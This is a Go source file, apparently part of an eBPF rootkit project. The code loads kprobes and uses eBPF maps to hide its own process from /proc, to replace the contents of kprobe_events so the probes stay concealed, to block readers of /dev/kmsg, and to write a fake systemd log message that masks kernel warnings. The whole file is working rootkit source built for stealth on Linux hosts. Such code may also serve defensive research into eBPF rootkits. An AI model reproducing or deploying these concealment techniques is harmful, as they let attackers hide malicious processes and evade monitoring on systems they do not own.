package hidden

import (
	"bytes"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/mattn/go-zglob"

	"github.com/DataDog/ebpf"
	"github.com/DataDog/ebpf/manager"
)

func (rk *RkHidden) GetProcPaths(pid int) []string {
	matches, err := zglob.Glob(fmt.Sprintf("/proc/%d/**", pid))
	if err != nil {
		return nil
	}
	return matches
}

func (rk *RkHidden) GetRkFdKeys(path string) []RkFdKey {
	matches, err := filepath.Glob("/proc/*/fd/*")
	if err != nil {
		return nil
	}

	var keys []RkFdKey
	for _, match := range matches {
		if f, err := os.Readlink(match); err == nil {
			if f == path {
				fd, err := strconv.ParseInt(filepath.Base(match), 10, 64)
				if err != nil {
					continue
				}

				els := strings.Split(match, "/")
				pid, err := strconv.ParseInt(els[2], 10, 64)
				if err != nil {
					continue
				}

				keys = append(keys, RkFdKey{
					Fd:  uint64(fd),
					Pid: uint32(pid),
				})
			}
		}
	}

	return keys
}

type RkHidden struct {
	Options         manager.Options
	MainManager     *manager.Manager
	OverrideManager *manager.Manager

	KprobeEvents []byte

	HandleError func(err error)
}

func (rk *RkHidden) Kmsg(str string) {
	f, err := os.OpenFile("/dev/kmsg", os.O_WRONLY|os.O_APPEND, os.ModePerm)
	if err != nil {
		return
	}
	defer f.Close()
	f.WriteString(str)
}

func (rk *RkHidden) PutFdContent(m *ebpf.Map, id uint64, reader io.Reader) {
	key := RkFdContentKey{
		ID: id,
	}

	for {
		RkFdContent := RkFdContent{}

		n, err := reader.Read(RkFdContent.Content[:])
		if err != nil {
			return
		}

		if n == 0 {
			break
		}

		RkFdContent.Size = uint64(n)

		if err := m.Put(key.Bytes(), RkFdContent.Bytes()); err != nil {
			return
		}

		key.Chunk++
	}
}

func (rk *RkHidden) PutPathAttr(m *ebpf.Map, path string, attr PathAttr) {
	var zeroAttr PathAttr
	for i, key := range RkPathKeys(path) {
		if i == 0 {
			if err := m.Put(key.Bytes(), attr.Bytes()); err != nil {
				rk.HandleError(err)
			}
		} else {
			if err := m.Put(key.Bytes(), zeroAttr.Bytes()); err != nil {
				rk.HandleError(err)
			}
		}
	}
}

func (rk *RkHidden) BlockKmsg() []RkFdKey {
	rkFdKeys := rk.GetRkFdKeys("/dev/kmsg")

	filesMap, _, err := rk.MainManager.GetMap("rk_fd_attrs")
	if err != nil {
		HandleError(err)
		return nil
	}

	// block process already having fd on kmsg
	for _, fdKey := range rkFdKeys {
		fdAttr := RkFdAttr{
			Action: OverrideReturn,
		}

		if err = filesMap.Put(fdKey.Bytes(), fdAttr.Bytes()); err != nil {
			rk.HandleError(err)
		}
	}

	// block process that will open kmsg
	pathKeysMap, _, _ := rk.MainManager.GetMap("rk_path_keys")
	attr := PathAttr{
		FSType: "devtmpfs",
		Action: OverrideReturn,
	}
	rk.PutPathAttr(pathKeysMap, "kmsg", attr)

	// send fake message to force the processes to read and to exit
	rk.Kmsg("systemd[1]: Resync Network Time Service.")

	return rkFdKeys
}

func (rk *RkHidden) UnBlockKsmg(rkFdKeys []RkFdKey) {
	filesMap, _, err := rk.MainManager.GetMap("rk_fd_attrs")
	if err != nil {
		rk.HandleError(err)
		return
	}

	// unblock
	for _, RkFdKey := range rkFdKeys {
		filesMap.Delete(RkFdKey.Bytes())
	}
}

func (rk *RkHidden) OverrideContent(fsType string, path string, reader io.Reader) {
	id := FNVHashStr(fsType + "/" + path)

	attr := PathAttr{
		FSType:     "tracefs",
		Action:     OverrideContent,
		OverrideID: id,
	}

	pathKeysMap, _, _ := rk.MainManager.GetMap("rk_path_keys")
	rk.PutPathAttr(pathKeysMap, path, attr)

	contentsMap, _, _ := rk.MainManager.GetMap("rk_fd_contents")
	rk.PutFdContent(contentsMap, id, reader)
}

func (rk *RkHidden) OverrideReturn(fsType string, path string, value int64) {
	attr := PathAttr{
		FSType:      fsType,
		Action:      OverrideReturn,
		ReturnValue: value,
	}

	pathKeysMap, _, _ := rk.MainManager.GetMap("rk_path_keys")
	rk.PutPathAttr(pathKeysMap, path, attr)
}

func (rk *RkHidden) HideFile(fsType string, dir string, file string) {
	attr := PathAttr{
		FSType:     fsType,
		Action:     HideFile,
		HiddenHash: FNVHashStr(file),
	}

	pathKeysMap, _, _ := rk.MainManager.GetMap("rk_path_keys")
	rk.PutPathAttr(pathKeysMap, dir, attr)
}

func (rk *RkHidden) InitOverride() {
	rkFilesMap, _, _ := rk.MainManager.GetMap("rk_files")
	rkFdAttrsMap, _, _ := rk.MainManager.GetMap("rk_fd_attrs")
	rkFdContentsMap, _, _ := rk.MainManager.GetMap("rk_fd_contents")
	rkGetdentsMap, _, _ := rk.MainManager.GetMap("rk_getdents")

	rk.Options.MapEditors = map[string]*ebpf.Map{
		"rk_files":       rkFilesMap,
		"rk_fd_attrs":    rkFdAttrsMap,
		"rk_fd_contents": rkFdContentsMap,
		"rk_getdents":    rkGetdentsMap,
	}
	rk.Options.TailCallRouter = []manager.TailCallRoute{
		{
			ProgArrayName: "rk_progs",
			Key:           uint32(FillWithZeroProg),
			ProbeIdentificationPair: manager.ProbeIdentificationPair{
				Section: "kprobe/fill_with_zero",
			},
		},
		{
			ProgArrayName: "rk_progs",
			Key:           uint32(OverrideGetDents),
			ProbeIdentificationPair: manager.ProbeIdentificationPair{
				Section: "kprobe/override_getdents",
			},
		},
	}

	if err := rk.OverrideManager.InitWithOptions(overrideAsset(), rk.Options); err != nil {
		rk.HandleError(err)
	}

	// Start the override manager
	if err := rk.OverrideManager.Start(); err != nil {
		rk.HandleError(err)
	}

	// update main tail call with the ones from user
	kmsgProg, _, _ := rk.OverrideManager.GetProgram(manager.ProbeIdentificationPair{Section: "kprobe/kmsg"})
	overrideContentProg, _, _ := rk.OverrideManager.GetProgram(manager.ProbeIdentificationPair{Section: "kprobe/override_content"})
	overrideGetDents, _, _ := rk.OverrideManager.GetProgram(manager.ProbeIdentificationPair{Section: "kprobe/override_getdents"})
	routes := []manager.TailCallRoute{
		{
			ProgArrayName: "rk_progs",
			Key:           uint32(KMsgProg),
			Program:       kmsgProg[0],
		},
		{
			ProgArrayName: "rk_progs",
			Key:           uint32(OverrideContentProg),
			Program:       overrideContentProg[0],
		},
		{
			ProgArrayName: "rk_progs",
			Key:           uint32(OverrideGetDents),
			Program:       overrideGetDents[0],
		},
	}
	rk.MainManager.UpdateTailCallRoutes(routes...)

	pathKeysMap, _, _ := rk.MainManager.GetMap("rk_path_keys")

	// kmsg override
	attr := PathAttr{
		FSType: "devtmpfs",
		Action: KMsgProg,
	}
	rk.PutPathAttr(pathKeysMap, "kmsg", attr)

	// kprobe_events override
	rk.OverrideContent("tracefs", "kprobe_events", bytes.NewReader(rk.KprobeEvents))

	// proc override
	/*for _, path := range rk.GetProcPaths(os.Getpid()) {
		rk.OverrideReturn("proc", strings.TrimPrefix(path, "/proc/"), -2)
	}*/
	rk.OverrideReturn("proc", strconv.Itoa(os.Getpid()), -2)
	rk.HideFile("proc", "/", strconv.Itoa(os.Getpid()))
}

func (rk *RkHidden) Start() {
	rk.Options = manager.Options{
		DefaultKProbeMaxActive: 512,
		DefaultProbeRetry:      2,
		DefaultProbeRetryDelay: time.Second,
		ConstantEditors: []manager.ConstantEditor{
			{
				Name:  "rk_pid",
				Value: uint64(os.Getpid()),
			},
		},
	}

	// before loading kprobes save previous state of kprobe_events
	file, err := os.Open("/sys/kernel/debug/tracing/kprobe_events")
	if err == nil {
		defer file.Close()
		rk.KprobeEvents, _ = ioutil.ReadAll(file)
	}

	// Initialize the main manager
	if err := rk.MainManager.InitWithOptions(mainAsset(), rk.Options); err != nil {
		HandleError(err)
	}

	// Start the manager
	if err := rk.MainManager.Start(); err != nil {
		HandleError(err)
	}

	// before overriding block kmsg warnings
	rkFdKeys := rk.BlockKmsg()

	// now we can override
	rk.InitOverride()

	// unblock kmsg
	rk.UnBlockKsmg(rkFdKeys)

	fmt.Printf("Started: %d\n", os.Getpid())
}

func (rk *RkHidden) Stop() {
	if err := rk.MainManager.Stop(manager.CleanAll); err != nil {
		rk.HandleError(err)
	}

	if err := rk.OverrideManager.Stop(manager.CleanAll); err != nil {
		rk.HandleError(err)
	}
}

func NewRkHidden() *RkHidden {
	return &RkHidden{
		MainManager:     &manager.Manager{Probes: MainProbes},
		OverrideManager: &manager.Manager{Probes: OverrideProbes},
		HandleError:     HandleError,
	}
}
